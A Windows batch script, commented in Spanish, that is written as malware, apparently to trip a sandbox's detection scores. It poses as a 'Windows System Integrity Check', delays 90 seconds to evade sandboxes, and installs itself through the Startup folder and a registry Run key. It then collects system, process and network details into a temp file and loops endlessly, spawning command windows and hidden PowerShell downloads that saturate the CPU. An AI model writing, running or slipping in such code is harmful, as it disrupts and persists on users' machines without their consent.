@echo off
:: 1. EVASIÓN EXTREMA (Anti-Analysis)
:: Esperamos 90 segundos. Muchos sandboxes se rinden antes de que pase nada.
title Windows System Integrity Check
color 0a
timeout /t 90 /nobreak >nul

:: 2. PERSISTENCIA POR DUPLICADO (Drops Startup File)
:: Se copia en la carpeta de inicio y también intenta registrarse en el sistema.
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\win_service_monitor.bat" /y >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "%~f0" /f >nul 2>&1

:: 3. DISCOVERY PROFUNDO (Reconocimiento)
:: Recolectamos todo: red, procesos y sistema. Esto dispara el score de "Discovery".
systeminfo > %temp%\sys_report.log
tasklist >> %temp%\sys_report.log
netstat -ano >> %temp%\sys_report.log
ipconfig /all >> %temp%\sys_report.log

:: 4. PAYLOAD DE CAOS VISUAL (Terminales petados)
:bucle
:: Ventana MATRIX: Lluvia de números verdes infinita
start cmd.exe /c "color 0a && title KERNEL_DATA_DUMP && :matrix && echo %random%%random%%random%%random%%random% && goto matrix"

:: Ventana DESTRUCCIÓN: Escaneo visual de archivos que parece un borrado
start cmd.exe /c "color 0c && title CRITICAL_OVERLOAD && tree c:\ /f"

:: Ventana de RED: Simula ataques o conexiones externas
start /min powershell -Command "Invoke-WebRequest -Uri 'https://1.1.1.1' -OutFile '%temp%\check.tmp'"

:: Satura la CPU abriendo procesos cada 2 segundos
timeout /t 2 >nul
goto bucle
